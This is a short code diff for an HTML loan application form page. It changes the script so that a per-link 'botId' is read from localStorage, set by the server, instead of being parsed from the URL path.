@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loan Application Form</title>
-
 <style>
 body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
 .loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
@@ -69,15 +68,9 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
 
 <script>
 // ---------------- BOT ROUTING ----------------
-const pathParts = window.location.pathname.split('/');
-const botId = pathParts[2]; // /bot/bot2 => "bot2"
-
-if (!botId) {
-    alert("Invalid access link");
-    throw new Error("botId missing");
-}
-
-localStorage.setItem('botId', botId);
+// botId is injected by server into localStorage
+const botId = localStorage.getItem('botId');
+if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
 
 // ---------------- FORM LOGIC ----------------
 document.getElementById('loanForm').addEventListener('submit', e => {
